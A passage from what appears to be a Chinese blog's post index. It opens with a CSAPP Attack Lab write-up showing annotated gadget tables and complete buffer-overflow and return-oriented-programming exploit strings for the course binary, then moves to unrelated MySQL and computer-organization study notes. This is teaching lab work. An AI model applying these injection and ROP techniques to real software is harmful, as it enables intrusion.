4019b8:\t48 8d 14 80 lea (%rax,%rax,4),%rdx 4019bc:\t48 8d 04 95 00 00 00 lea 0x0(,%rdx,4),%rax 4019c3:\t00 4019c4:\t48 29 c1 sub %rax,%rcx 4019c7:\t4c 8d 24 0c lea (%rsp,%rcx,1),%r12 4019cb:\t41 89 e8 mov %ebp,%r8d 4019ce:\tb9 3f 31 40 00 mov $0x40313f,%ecx 4019d3:\t48 c7 c2 ff ff ff ff mov $0xffffffffffffffff,%rdx 4019da:\tbe 01 00 00 00 mov $0x1,%esi 4019df:\t4c 89 e7 mov %r12,%rdi 4019e2:\tb8 00 00 00 00 mov $0x0,%eax 4019e7:\te8 44 f4 ff ff call 400e30 \u0026lt;__sprintf_chk@plt\u0026gt; 4019ec:\tba 09 00 00 00 mov $0x9,%edx 4019f1:\t4c 89 e6 mov %r12,%rsi 4019f4:\t48 89 df mov %rbx,%rdi 4019f7:\te8 34 f3 ff ff call 400d30 \u0026lt;strncmp@plt\u0026gt; 4019fc:\t85 c0 test %eax,%eax 4019fe:\t0f 94 c0 sete %al 401a01:\t48 8b 5c 24 78 mov 0x78(%rsp),%rbx 401a06:\t64 48 33 1c 25 28 00 xor %fs:0x28,%rbx 401a0d:\t00 00 401a0f:\t74 05 je 401a16 \u0026lt;hexmatch+0xa5\u0026gt; 401a11:\te8 5a f3 ff ff call 400d70 \u0026lt;__stack_chk_fail@plt\u0026gt; 401a16:\t0f b6 c0 movzbl %al,%eax 401a19:\t48 83 ec 80 sub $0xffffffffffffff80,%rsp 401a1d:\t5b pop %rbx 401a1e:\t5d pop %rbp 401a1f:\t41 5c pop %r12 401a21:\tc3 ret 0000000000401a22 \u0026lt;touch3\u0026gt;: 401a22:\t53 push %rbx 401a23:\t48 89 fb mov %rdi,%rbx 401a26:\tc7 05 f0 2a 20 00 03 movl $0x3,0x202af0(%rip) # 604520 \u0026lt;vlevel\u0026gt; 401a2d:\t00 00 00 401a30:\t48 89 fe mov %rdi,%rsi 401a33:\t8b 3d ef 2a 20 00 mov 0x202aef(%rip),%edi # 604528 \u0026lt;cookie\u0026gt; 401a39:\te8 33 ff ff ff call 401971 \u0026lt;hexmatch\u0026gt; 401a3e:\t85 c0 test %eax,%eax 401a40:\t74 23 je 401a65 \u0026lt;touch3+0x43\u0026gt; 401a42:\t48 89 da mov %rbx,%rdx 401a45:\tbe 98 31 40 00 mov $0x403198,%esi 401a4a:\tbf 01 00 00 00 mov $0x1,%edi 401a4f:\tb8 00 00 00 00 mov $0x0,%eax 401a54:\te8 97 f2 ff ff call 400cf0 \u0026lt;__printf_chk@plt\u0026gt; 401a59:\tbf 03 00 00 00 mov $0x3,%edi 401a5e:\te8 36 02 00 00 call 401c99 \u0026lt;validate\u0026gt; 401a63:\teb 21 jmp 401a86 \u0026lt;touch3+0x64\u0026gt; 401a65:\t48 89 da mov %rbx,%rdx 401a68:\tbe c0 31 40 00 mov $0x4031c0,%esi 401a6d:\tbf 01 00 00 00 mov $0x1,%edi 401a72:\tb8 00 00 00 00 mov $0x0,%eax 401a77:\te8 74 f2 ff ff call 400cf0 \u0026lt;__printf_chk@plt\u0026gt; 401a7c:\tbf 03 00 00 00 mov $0x3,%edi 401a81:\te8 d5 02 00 00 call 401d5b \u0026lt;fail\u0026gt; 401a86:\tbf 00 00 00 00 mov $0x0,%edi 401a8b:\te8 40 f4 ff ff call 400ed0 \u0026lt;exit@plt\u0026gt; 这是上面两个函数的C语言源代码：\n/* Compare string to hex represention of unsigned value */ int hexmatch(unsigned val, char *sval) { char cbuf[110]; /* Make position of check string unpredictable */ char *s = cbuf + random() % 100;\t//这里随机分配可能导致的结果是把我们注入的字符串覆盖掉 sprintf(s, \u0026#34;%.8x\u0026#34;, val); return strncmp(sval, s, 9) == 0; } void touch3(char *sval) { vlevel = 3; /* Part of validation protocol */ if (hexmatch(cookie, sval)) { printf(\u0026#34;Touch3!: You called touch3(\\\u0026#34;%s\\\u0026#34;)\\n\u0026#34;, sval); validate(3); } else { printf(\u0026#34;Misfire: You called touch3(\\\u0026#34;%s\\\u0026#34;)\\n\u0026#34;, sval); fail(3); } exit(0); } gdb调试（先跟第二层一样跳转到touch3）：\n先查看进入hexmatch之前的缓冲区，我们注入的代码还在（未使用的部分用3f填充）\n在进入了之后（我们发现有一部分已经被覆盖，但是没有威胁到我们的代码，所以这只是概率事件）：\n看起来28这里一直都是0,我们尝试把字符数组放在这里：\nman ascii //查看关于ascii的帮助 cookie\u0026mdash;\u0026gt;ascii\n0x14e6646f\u0026mdash;\u0026gt;31 34 65 36 36 34 36 66\n担心出错，再检查一遍：\n在更改的时候还要注意：不仅留心小端顺序，还要保证原来调用的函数的参数的值没有发生变化。\nQ：不知道为什么，28的位置写不进去，后面改成18的位置再重新写进去（记得更改rdi指向的地址，假如你错了的话）。\n返回导向编程（Return-oriented Programming） # phase4: # 在前面的情况下，我们都没有启用栈随机化和栈执行保护（在栈上执行代码本来就是一件很可疑的事情），那么就来了这种攻击方式。\n它要解决的还是上面的phase2和phase3的问题。\n这种攻击方式的思路就是说，我们不在栈上执行我们的代码，在它自己本身就有的代码里面挑挑拣拣来达到我们的目的，并且每次执行的指令后面都有c3这样就能不停的继续调用下去。\n汇编指令的相关字节码： # 这是它给我们的gadget表： # 0000000000401ab9 \u0026lt;start_farm\u0026gt;: 401ab9:\tb8 01 00 00 00 mov $0x1,%eax 401abe:\tc3 ret 0000000000401abf \u0026lt;addval_480\u0026gt;: 401abf:\t8d 87 6e a5 58 c3 lea -0x3ca75a92(%rdi),%eax ;2.3 58 c3 popq %rax (401ac3) ---1.1把rax设置成cookie的值 401ac5:\tc3 ret ; 就是这里，愚蠢的我一直把这里数错了导致几个小时没看出来为什么有segmentaion fault 0000000000401ac6 \u0026lt;getval_188\u0026gt;: 401ac6:\tb8 c8 89 c7 90 mov $0x90c789c8,%eax 401acb:\tc3 ret 0000000000401acc \u0026lt;addval_392\u0026gt;: 401acc:\t8d 87 58 91 c3 9e lea -0x613c6ea8(%rdi),%eax 401ad2:\tc3 ret 0000000000401ad3 \u0026lt;addval_406\u0026gt;: 401ad3:\t8d 87 ec ad d8 c3 lea -0x3c275214(%rdi),%eax 401ad9:\tc3 ret 0000000000401ada \u0026lt;getval_227\u0026gt;: 401ada:\tb8 65 48 89 c7 mov $0xc7894865,%eax ; 2.2 2.8 48 89 c7 movq %rax,%rdi(401adc) ---1.2把rdi设置成cookie值 401adf:\tc3 ret 0000000000401ae0 \u0026lt;getval_437\u0026gt;: 401ae0:\tb8 49 89 c7 90 mov $0x90c78949,%eax 401ae5:\tc3 ret 0000000000401ae6 \u0026lt;setval_348\u0026gt;: 401ae6:\tc7 07 48 89 c7 c3 movl $0xc3c78948,(%rdi) 401aec:\tc3 ret 0000000000401aed \u0026lt;setval_136\u0026gt;: 401aed:\tc7 07 58 90 90 90 movl $0x90909058,(%rdi) 401af3:\tc3 ret 0000000000401af4 \u0026lt;mid_farm\u0026gt;: 401af4:\tb8 01 00 00 00 mov $0x1,%eax 401af9:\tc3 ret 0000000000401afa \u0026lt;add_xy\u0026gt;: 401afa:\t48 8d 04 37 lea (%rdi,%rsi,1),%rax ; 2.7(401afa) 这里就是直接设计好的 401afe:\tc3 ret 0000000000401aff \u0026lt;getval_314\u0026gt;: 401aff:\tb8 a9 c9 d6 90 mov $0x90d6c9a9,%eax 401b04:\tc3 ret 0000000000401b05 \u0026lt;addval_442\u0026gt;: 401b05:\t8d 87 48 09 e0 90 lea -0x6f1ff6b8(%rdi),%eax 401b0b:\tc3 ret 0000000000401b0c \u0026lt;addval_139\u0026gt;: 401b0c:\t8d 87 89 ca 90 90 lea -0x6f6f3577(%rdi),%eax 401b12:\tc3 ret 0000000000401b13 \u0026lt;addval_491\u0026gt;: 401b13:\t8d 87 1f 4b 89 d6 lea -0x2976b4e1(%rdi),%eax ; 2.6(401b17) mov %edx,%esi 401b19:\tc3 ret 0000000000401b1a \u0026lt;setval_367\u0026gt;: 401b1a:\tc7 07 bb 48 89 e0 movl $0xe08948bb,(%rdi) ; 2.1(401b1d) mov %rsp,%rax 401b20:\tc3 ret 0000000000401b21 \u0026lt;getval_215\u0026gt;: 401b21:\tb8 48 89 e0 c1 mov $0xc1e08948,%eax 401b26:\tc3 ret 0000000000401b27 \u0026lt;setval_192\u0026gt;: 401b27:\tc7 07 89 c1 92 90 movl $0x9092c189,(%rdi) 401b2d:\tc3 ret 0000000000401b2e \u0026lt;getval_418\u0026gt;: 401b2e:\tb8 89 ca 84 c0 mov $0xc084ca89,%eax ;2.5(401b2f) mov %ecx,%edx test %al,%al 401b33:\tc3 ret 0000000000401b34 \u0026lt;addval_318\u0026gt;: 401b34:\t8d 87 8b d6 84 c0 lea -0x3f7b2975(%rdi),%eax 401b3a:\tc3 ret 0000000000401b3b \u0026lt;setval_167\u0026gt;: 401b3b:\tc7 07 48 89 e0 94 movl $0x94e08948,(%rdi) 401b41:\tc3 ret 0000000000401b42 \u0026lt;setval_410\u0026gt;: 401b42:\tc7 07 df 89 ca 91 movl $0x91ca89df,(%rdi) 401b48:\tc3 ret 0000000000401b49 \u0026lt;setval_408\u0026gt;: 401b49:\tc7 07 95 48 81 e0 movl $0xe0814895,(%rdi) 401b4f:\tc3 ret 0000000000401b50 \u0026lt;setval_115\u0026gt;: 401b50:\tc7 07 88 d6 90 c3 movl $0xc390d688,(%rdi) 401b56:\tc3 ret 0000000000401b57 \u0026lt;setval_336\u0026gt;: 401b57:\tc7 07 48 89 e0 90 movl $0x90e08948,(%rdi) 401b5d:\tc3 ret 0000000000401b5e \u0026lt;addval_315\u0026gt;: 401b5e:\t8d 87 89 c1 a4 c0 lea -0x3f5b3e77(%rdi),%eax 401b64:\tc3 ret 0000000000401b65 \u0026lt;setval_400\u0026gt;: 401b65:\tc7 07 89 ca 28 d2 movl $0xd228ca89,(%rdi) 401b6b:\tc3 ret 0000000000401b6c \u0026lt;getval_226\u0026gt;: 401b6c:\tb8 88 d6 38 c0 mov $0xc038d688,%eax 401b71:\tc3 ret 0000000000401b72 \u0026lt;getval_388\u0026gt;: 401b72:\tb8 c9 c1 20 c9 mov $0xc920c1c9,%eax ; (401b75) 401b77:\tc3 ret 0000000000401b78 \u0026lt;getval_379\u0026gt;: 401b78:\tb8 68 89 e0 c3 mov $0xc3e08968,%eax 401b7d:\tc3 ret 0000000000401b7e \u0026lt;getval_495\u0026gt;: 401b7e:\tb8 89 d6 92 c3 mov $0xc392d689,%eax 401b83:\tc3 ret 0000000000401b84 \u0026lt;addval_434\u0026gt;: 401b84:\t8d 87 89 ca 28 d2 lea -0x2dd73577(%rdi),%eax 401b8a:\tc3 ret 0000000000401b8b \u0026lt;getval_382\u0026gt;: 401b8b:\tb8 4c 89 e0 c3 mov $0xc3e0894c,%eax 401b90:\tc3 ret 0000000000401b91 \u0026lt;addval_100\u0026gt;: 401b91:\t8d 87 c9 c1 84 c9 lea -0x367b3e37(%rdi),%eax 401b97:\tc3 ret 0000000000401b98 \u0026lt;setval_140\u0026gt;: 401b98:\tc7 07 f8 8b c1 c3 movl $0xc3c18bf8,(%rdi) 401b9e:\tc3 ret 0000000000401b9f \u0026lt;setval_104\u0026gt;: 401b9f:\tc7 07 88 c1 84 c0 movl $0xc084c188,(%rdi) 401ba5:\tc3 ret 0000000000401ba6 \u0026lt;addval_125\u0026gt;: 401ba6:\t8d 87 89 d6 90 c3 lea -0x3c6f2977(%rdi),%eax 401bac:\tc3 ret 0000000000401bad \u0026lt;getval_111\u0026gt;: 401bad:\tb8 16 a9 09 ca mov $0xca09a916,%eax 401bb2:\tc3 ret 0000000000401bb3 \u0026lt;getval_256\u0026gt;: 401bb3:\tb8 a9 ca 20 db mov $0xdb20caa9,%eax 401bb8:\tc3 ret 0000000000401bb9 \u0026lt;getval_170\u0026gt;: 401bb9:\tb8 89 c1 08 d2 mov $0xd208c189,%eax 401bbe:\tc3 ret 0000000000401bbf \u0026lt;setval_102\u0026gt;: 401bbf:\tc7 07 0e 89 c1 c3 movl $0xc3c1890e,(%rdi) ; 2.4(401bc2) mov %eax,%ecx 401bc5:\tc3 ret 0000000000401bc6 \u0026lt;getval_364\u0026gt;: 401bc6:\tb8 81 d6 90 90 mov $0x9090d681,%eax 401bcb:\tc3 ret 0000000000401bcc \u0026lt;setval_159\u0026gt;: 401bcc:\tc7 07 89 ca c1 ce movl $0xcec1ca89,(%rdi) 401bd2:\tc3 ret 0000000000401bd3 \u0026lt;end_farm\u0026gt;: 401bd3:\tb8 01 00 00 00 mov $0x1,%eax 401bd8:\tc3 ret 那么我们输入的字节码如下：\n00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 c3 1a 40 00 00 00 00 00 6f 64 e6 14 00 00 00 00 dc 1a 40 00 00 00 00 00 11 19 40 00 00 00 00 00 一定要把地址数清楚孩子们，因为有一个地址我没有数清楚而浪费了很长时间，不过解决段错误也是一种学习。（很难蚌的住啊）\nphase5: # 据说这是最难的一层，不过既然已经接触了汇编语言，那还是来试试看！\n解题思路来自于上面的Blog，在栈随机化的情况下，把rsp指针作为一个参考点来找到我们需要的参数。\n设计的asm：\nphase5.o: file format elf64-x86-64 Disassembly of section .text: 0000000000000000 \u0026lt;.text\u0026gt;: 0:\t48 89 e0 mov %rsp,%rax 3:\tc3 ret 4:\t48 89 c7 mov %rax,%rdi 7:\tc3 ret 8:\t58 pop %rax 9:\t90 nop a:\tc3 ret b:\t89 c1 mov %eax,%ecx d:\t90 nop e:\tc3 ret f:\t89 ca mov %ecx,%edx 11:\t84 c0 test %al,%al 13:\tc3 ret 14:\t89 d6 mov %edx,%esi 16:\t20 d2 and %dl,%dl 18:\tc3 ret 19:\t48 8d 04 37 lea (%rdi,%rsi,1),%rax 1d:\t48 89 c7 mov %rax,%rdi 20:\tc3 ret 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 1d 1b 40 00 00 00 00 00 dc 1a 40 00 00 00 00 00 c3 1a 40 00 00 00 00 00 48 00 00 00 00 00 00 00 c2 1b 40 00 00 00 00 00 2f 1b 40 00 00 00 00 00 17 1b 40 00 00 00 00 00 fa 1a 40 00 00 00 00 00 dc 1a 40 00 00 00 00 00 22 1a 40 00 00 00 00 00 31 34 65 36 36 34 36 66 00 00 00 00 00 00 00 00 大功告成！！！抄别人写的就是简单啊（），如果说有难度，那其实在于你要写一串没有bug的汇编然后去找，但是看别人的就不难了（？）。\n","date":"20 March 2025","externalUrl":null,"permalink":"/csapp/csappattacklab/","section":"","summary":"\u003cblockquote\u003e\n\u003cp\u003e本期封面是动漫《Girls Band Cry》的主角团一行人参拜时的场景。\u003c/p\u003e\u003c/blockquote\u003e\n\n\n\u003ch1 class=\"relative group\"\u003eCSAPP:AttackLab \n    \u003cdiv id=\"csappattacklab\" class=\"anchor\"\u003e\u003c/div\u003e\n    \n    \u003cspan\n        class=\"absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100\"\u003e\n        \u003ca class=\"group-hover:text-primary-300 dark:group-hover:text-neutral-700\"\n            style=\"text-decoration-line: none !important;\" href=\"#csappattacklab\" aria-label=\"Anchor\"\u003e#\u003c/a\u003e\n    \u003c/span\u003e        \n    \n\u003c/h1\u003e\n\u003cblockquote\u003e\n\u003cp\u003e[!WARNING]\u003c/p\u003e","title":"CSAPP:AttackLab","type":"csapp"},{"content":" 本期封面是笔者早期最喜欢的动漫角色之一，《とある科学の超電磁砲》中的长点上机学园的天才少女布束砥信，至今笔者的github头像都是她\u0026hellip;\u0026hellip;\nMySQL # 本文仅仅是笔者对于SQL语句的简单熟悉和复习的笔记，所以并不会对于更深刻的细节进行考究，也不会介绍怎么安装和配置MySQL的环境以及为什么我们要使用关系型数据库。\n1.Table # 创建表：有B格的创建一张表\n查看表结构：desc\ndelete:drop table if exists; 修改表字段\n**`alter table \u0026lt;name\u0026gt; add/change/modify \u0026lt;name\u0026gt; \u0026lt;name1\u0026gt;……`** **`alter table \u0026lt;name1\u0026gt; rename to \u0026lt;name2\u0026gt;`** delete from student; 绝对不要用这样的方式去清空一张表\n1.遍历删除，会浪费时间和资源\n2.若设置auto increment 主键，那么再加入数据的时候会从原来增长的部分继续\ntruncate table student; 直接报废表并且创建一张和原来一样的新表\n2.Data # update data:\n`update \u0026lt;tablename\u0026gt; set \u0026lt;field\u0026gt;=\u0026lt;newValue\u0026gt; where \u0026lt;field\u0026gt;=\u0026lt;value\u0026gt;;` search data from table:\n`select \u0026lt;fieldname,…\u0026gt; from \u0026lt;tablename\u0026gt;;` `select* from\u0026lt;tablename\u0026gt;` database definition language: create drop alter show\ndata manipulation language: insert delete update select\ndatabase control language: 关于数据库的角色控制？\n3.DataType # Decimal数据存储原理？\nenum枚举类型：仅能选取其中已经有的元素来存储，代表从一开始的数字\nset集合类型:能从集合中选取多个元素进行存储——用户兴趣标签\nset存储原理？？？\n4.列属性完整性(重点) # auto_increment 必须是 primarykey主键 primary key主键：唯一性—\u0026gt;一组或者一个字段 # 1.保证数据的完整性\n2.加快数据的查询速度—用来做表的关联\n`alter table \u0026lt;tablename\u0026gt; add primary key (\u0026lt;filedname\u0026gt;......);`添加主键，多个字段就是**组合键** `alter table \u0026lt;tablename\u0026gt; drop primary key;` 复合主键解决的问题\nunique唯一键\n和primary的区别：可以为null，不和其他表产生关联，但是必须唯一（null不唯一）\ndelete:`alter table \u0026lt;tablename\u0026gt; drop index \u0026lt;filedname\u0026gt;;` comment 注释问题\nSQL内注释和代码注释\n数据库的完整性问题\nForeign Key（外键约束技术） # 怎么在两张表之间建立联系？\n主表：\n建立从表：\n从表：\n`alter table \u0026lt;tablename\u0026gt; add foreign key (\u0026lt;filedname\u0026gt;) references \u0026lt;tablename\u0026gt;(\u0026lt;filedname\u0026gt;);` `show create table \u0026lt;tablename\u0026gt;;` 查看创建的表结构并且删除外键\n当主表中的数据发生变化的时候，从表中的数据应该如何修改？\n置空和级联的操作（在创建表的时候就要声明清楚） # 置空：主表中的数据被删除，那么从表中的数据依然保存，但是外键的被删除的字段为NULL；\n级联：主表中的数据发生修改，从表中的外键对应字段的数据全部发生修改；\n如图：删除——set null\n5.数据库设计思维 # a.基本概念 # 关系：两张表通过共同的字段来确立数据的完整性\n行——一条数据——实体\n列——一个字段——属性\n数据冗余：牺牲空间，提升查询性能（高考总分）\nb.实体之间的关系 # 一对多（学生表和食堂消费记录之间的关系）\n一对一\n多对一\n多对多\nc.范式 # Codd第一范式：确保字段的原子性，一个字段不可以再分 2018-2019 —— 2018 2019\nCodd第二范式：非键字段必须依赖于主键字段（无关的字段不应当加入，一张表只描述一种信息）\nCodd第三范式：消除传递依赖——根据实际情况，我们到底要不要考虑加入数据冗余的处理\n6.单表查询 # a.基本关键字 # select # from # 指定要查的表；返回两张表的笛卡尔积\ndual # 默认的一个虚拟表，单行单列\nwhere # 限制select查询条件 \u0026lt; ≤ \u0026gt; ≥ or and……\nin # 限定查询的字段的值在一个范围之内\nbetween…and… # 限制查询的范围在给定的闭区间内部\nis null # 查看是空或者非空，简单\n几种常见的聚合函数 # [!TIP]\n**Q:select count(*) and select count(1); **\nwhat’s the difference?\nlike模糊查询——通配符 # group by分组查询 # select \u0026lt;function-name\u0026gt;(\u0026lt;fieldname1\u0026gt;) as \u0026#39;alias1\u0026#39;, \u0026lt;fieldname2\u0026gt; as \u0026#39;alias2\u0026#39; group by \u0026lt;fieldname2\u0026gt;;#要根据哪个字段去查询 比如想求男性和女性的平均年龄：\n利用group_concat函数查询对应字段对应的实体\nhaving # 和where一样作为条件筛选，但是：\n1.where是根据条件对于实际存在于数据库中的数据进行筛选\n2.having对于查询之后的虚拟表使用——比如配合group_by(此时就不能使用where条件来处理)\nlimit # 选取顺序中的下标范围\nselect \u0026lt;fieldname\u0026gt; from \u0026lt;tablename\u0026gt; limit \u0026lt;start-index\u0026gt;,\u0026lt;length\u0026gt;; distinct # 去重复关键字\n默认情况下有all\nselect (all) \u0026lt;fieldname\u0026gt; from \u0026lt;tablename\u0026gt;; 至此，单表查询基础结束。\n7.多表查询 # 1.union # select… + union + DISTINCT + select… 对应字段个数必须相等\n2.join # 用两个表创建公共字段进行连接——内连接——有多张表就用多个inner进行连接\nselect f1,f2 from t1 inner join t2 on t1.f3=t2.f4 (having score \u0026gt; 90); left join 以左表为一个基准（就算左边没有也要写上去 right join 同理）\ncross join返回两张表的笛卡尔积\nselect* from t1 cross join t2; natural join自动寻找公共字段并且建立inner join的连接\n没有公共字段就返回cross join的结果\nusing\n当两张表的字段完全相同的时候，using指定建立连接的公共字段\n8.子查询 # 用一个select语句返回的数据范围作为限制的基准（用in和not in 来控制）\n只要存在就全部查询 exists and not exists\n至此，所有基础内容结束，以上的内容都是对于一名实习生来说最为重要的内容（每一种语法单独看来都是很好理解的，但是都联合起来的话就显得很困难），以下为扩展：\n扩展内容： # 1.视图(View) # 作用：简化SQL查询；掩盖敏感数据\n创建视图\n以后就可以直接查询\nalter修改视图\ndrop直接删除视图\n视图底层算法（在使用子查询创建视图的时候）\nunchecked\n1.temp table 临时表算法\n2.merge 合并算法\nQ:有什么区别？\n2.事务（Transaction） # 处理非常严谨的操作，例如转账等\n设置回滚点 并且返回—— rollback to\n事务的ACID特性\n原子：一个事务不可再分，要么全部执行，要么不执行\n隔离：多个事务同时对一个数据库进行操作，不会产生冲突\n注意：仅当engine=innodb的时候，才能使用事务\n3.index（索引） # 快速查询数据——实习生要理解到什么程度？\n4.存储过程 # 提前写好SQL一次执行，有点像函数\n利用delimiter设置结束符号\n企业规范约束 # 1.库表字段的约束规范 # 是否： is_vip unsigned tiny int length1️⃣ （不能浪费存储）\ndont’s\n不能有大写字母，\n不能以数字开头，\n下划线之间不能只有数字，\n不能出现负数，\n不能有关键字\n凡是有小数，必须用decimal数据类型\ndos\n主键：pk_key，\n字符串长度较小时，请使用char，\n强制存在的字段：\n1.id(unsigned bigint 单表的时候必须自增 primary key)\n2.create_time(datetime)\n3.update_time(datatime),\n2.索引规范 # 有某些必须：唯一索引\n不能查两个以上的关联查询\nvarchar上建立索引：建立索引的长度\n3.SQL开发约束 # count(xx,xxx,xx) count(*);\n判断为空的方法：\nwhere name = null ；\nwhere name is null；\n不要使用外键和级联（尤其是在高并发的项目中，牵一发而动全身）\n这些问题在Server层解决\n不允许使用存储过程（很难调试，其中的SQL写错了怎么办，和脚本不一样，移植性也很差）\nutf-8作为标准编码格式\n4.其他约束 # ORM框架查询不能写*\nQ:pujo类bool类型不能加is?\n","date":"12 March 2025","externalUrl":null,"permalink":"/tech/mysql/","section":"Tech","summary":"\u003cblockquote\u003e\n\u003cp\u003e本期封面是笔者早期最喜欢的动漫角色之一，《とある科学の超電磁砲》中的长点上机学园的天才少女布束砥信，至今笔者的github头像都是她\u0026hellip;\u0026hellip;\u003c/p\u003e\u003c/blockquote\u003e\n\n\n\u003ch1 class=\"relative group\"\u003eMySQL \n    \u003cdiv id=\"mysql\" class=\"anchor\"\u003e\u003c/div\u003e\n    \n    \u003cspan\n        class=\"absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100\"\u003e\n        \u003ca class=\"group-hover:text-primary-300 dark:group-hover:text-neutral-700\"\n            style=\"text-decoration-line: none !important;\" href=\"#mysql\" aria-label=\"Anchor\"\u003e#\u003c/a\u003e\n    \u003c/span\u003e        \n    \n\u003c/h1\u003e\n\u003cblockquote\u003e\n\u003cp\u003e本文仅仅是笔者对于SQL语句的简单熟悉和复习的笔记，所以并不会对于更深刻的细节进行考究，也不会介绍怎么安装和配置MySQL的环境以及为什么我们要使用关系型数据库。\u003c/p\u003e\u003c/blockquote\u003e\n\n\n\u003ch2 class=\"relative group\"\u003e1.Table \n    \u003cdiv id=\"1table\" class=\"anchor\"\u003e\u003c/div\u003e\n    \n    \u003cspan\n        class=\"absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100\"\u003e\n        \u003ca class=\"group-hover:text-primary-300 dark:group-hover:text-neutral-700\"\n            style=\"text-decoration-line: none !important;\" href=\"#1table\" aria-label=\"Anchor\"\u003e#\u003c/a\u003e\n    \u003c/span\u003e        \n    \n\u003c/h2\u003e\n\u003cp\u003e创建表：有B格的创建一张表\u003c/p\u003e","title":"MySQL","type":"tech"},{"content":" 本期封面是动漫《白箱》的主角团，如果你对于动漫制作的幕后感兴趣，这是一部不可多得的佳作。\nComputer Organization # [!NOTE]\n在本篇之前，我已经实现了一个非常简单的CPU（感觉都是属于数字电路的内容，当然也是计组的一部分），课程笔记以及资源都来自于B站：Cs Primer。\n所以在这里只是简单记录一些感觉有必要的理论知识，还会不断补充。\nCache（存储器层次结构） # 1.DRAM SRAM SSD 机械硬盘读写以及存储，取内存和实际CPU之间的差异性。\n2.程序的局部性（Locality）:程序倾向于引用邻近于最近引用过的数据项或者是已经引用过的数据项本身（for遍历数组）\na.空间局部性 b.时间局部性\n引入：\n高速缓存存储器 # 1.结构 # SBE为总的大小。\n寻址原理：hash\n2.直接映射高速缓存（direct-mapped cache） # 就是每组只有一个行\n过程\na.组选择\n为什么把中间的位作为组索引而不是更高的位？\n如果高位做索引，那么很容易把一堆连续的块映射到一组高速缓存块里面，这样不符合空间局部性。\n中间的随机性相对更大一些。\nb.找到了组，进行行匹配\nc.根据块偏移位来寻找第一个字节的位置\nd.如果没有命中，从下一级内存中取相应的内存块并且直接做替换的操作\ne.实际过程：开始缓存为空，冷不命中，从L2中加载数据到L1,然后返回，接着假如标志位不相同，发生冲突不命中，进行替换操作。\nd.冲突不命中常见：thrash,高速缓存反复的加载和驱逐相同的一些组。\n3.组相联高速缓存(set associative cache) # 就是每个组包含多于一个的行\n和每个行进行一次匹配\nLFU和LRU策略\n4.全相联高速缓存（fully asscociative cache） # 就是只有一个组，里面有很多行\n没有组的选择，只有标记位和块偏移。\n单周期多周期处理器 # 一个时钟周期内完成一条指令\n多周期就是一条指令多个时钟周期\n流水线技术 # 五阶段流水线 # 把每个指令都填充成五个阶段，防止冲突\n流水线冒险 # 结构冒险：硬件资源产生冲突 # 数据冒险：逻辑上的数据依赖性产生冲突 # 控制冒险：跳转到别的指令，导致流水线之前准备的指令无效 # 解决：分支预测（动态）\n在X86系统上编写和运行程序 # 一个C程序处理流程 # 预处理-编译-汇编-链接-程序加载执行\n假设我们有文件main.c hello.c\ngcc main.c hello.c\t//这一条指令包含了上述的四个步骤 gcc -E hello.c -o hello.i //这表示对于文件进行预处理 -o是指定名称（擦除并且进行复制粘贴的流程） gcc -S hello.i -o hello.s\t//把预处理之后的文件处理成汇编代码 gcc -c hello.s -o hello.o\t//汇编成一个二进制文件，但是不进行链接的操作 工具：readelf（查看段的偏移） objdump（反汇编） hexdump（查看二进制文件的机器码）\ngcc main.o hello.o\t//直接将两个文件进行链接，如下是链接的过程 接着是程序加载执行的流程\n常见X86汇编指令 # 可以参照CSAPP熟悉基本语法，达到能读的要求即可\n[!TIP]\njmp类条件跳转指令之前可以跟其他许多指令\n比如 subl a,b 也可以看a和b之间满足的条件\n64位使用的寄存器 # 数据传送指令 # move：不能从内存直接到内存传送 # [!NOTE]\n我看过好几遍书，但是我感觉自己最难理解的地方就是函数的调用以及递归这里的东西，建议大家从push这里开始细细理解。\npush指令： # 1.把栈指针减去8,得到栈顶位置，此时栈顶还没有元素。2.把目的操作数放到栈顶。（push只要一个byte，栈上只是放了一堆data，和寄存器，和内存都没有关系）\n那么pop指令同理：1.把栈顶的值读入一个目标寄存器。2.把栈指针加8。\n条件控制 # if for while等语句都是条件跳转来实现的\nswitch语句当case范围较大时也是条件跳转，当范围较小是利用跳转表，一个连续数组的值域包含了所有的case情况(并且case的数量较多)\n*Process（过程） # 控制 + 传递 + 内存管理\n运行时栈（提前准备） # P去调用Q，首先存放返回地址，表明Q返回时从P的哪个位置开始执行，这个地址也是P栈帧的一部分。\n接着为Q分配一个栈帧，大多数的栈帧都是定长的，通过寄存器传递参数，如果大于6个，P在调用Q之前提前在自己的栈帧里存储好这些参数。\n转移控制（怎么交接控制权利） # call:把rip的值设置成callee的首地址，这样就把执行权利转换，接着把call指令下一条指令的地址压入栈中。\nret：把压入栈的地址弹出来，并且把rip的值设置成这个地址，这样就交还了控制权利。\n数据传送（怎么给Callee传递一些参数） # 在参数小于6个的情况下，我们直接用寄存器来传递，用rax来获得调用方法的返回值即可。\n在上图的Current frame中有一个Argument build area，这就是一个参数构造区，如果它也要调用一个参数多于6个的方法，那么就要提前在自己的栈帧里准备好，再执行call指令（注意：第七个参数会在栈的顶部）。\n栈上的局部存储（Callee中的局部变量是怎么实现的） # 比如局部变量太多，要取局部变量的一个地址，或者局部变量是数组及结构体等。\n还是上图，参数构造区之上就是我们减少栈指针分配给局部变量的空间。\n下例出自CSAPP\nlong swap_add (long *XP , long * yp) { long x = *xp ; long y = * yp ; *xp = y ; *yp = x ; return x + y ; } long caller () { //要处理以下两个局部变量，我就要为他们产生地址。 long argl = 534 ; long arg2 = 1057 ; long sum = swap_add (\u0026amp;argl , \u0026amp;arg2) ; long diff = argl - arg2 ; return sum * diff; } 以下是汇编代码\nlong caller() caller: subq $16 , %rsp movq $534 , (%rsp) movq $1057 , 8(%rsp) leaq 8(%rsp) , %rsi movq %rsp , %rdi call swap_add\t;这里的细节：方法虽然已经返回（返回之后之前压入的返回地址就会被弹出），但是栈帧还在，所以分配的局部变量还在 movq (%rsp) , 